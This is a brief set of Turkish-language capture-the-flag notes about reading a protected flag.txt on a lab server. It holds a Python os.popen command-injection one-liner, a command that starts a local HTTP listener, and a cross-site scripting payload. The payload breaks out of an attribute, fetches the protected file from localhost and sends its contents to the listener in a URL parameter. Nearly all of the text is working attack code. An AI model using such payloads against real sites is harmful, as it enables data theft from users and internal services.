Python saldırılarında bunu kullan
import os; print(os.popen("ls -l").read())


#linuxda sunucu dinleme 
senaryo: http://10.10.49.186:8080/flag.txt 
buradaki flagı okumak gerekiyor ama flag.txt yi almamız gerekiyor  ama 401 unauthorized veriliyor

python3 -m http.server 8000

'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://0.0.0.0:8000/?flag=' + encodeURIComponent(data));
    });
</script>

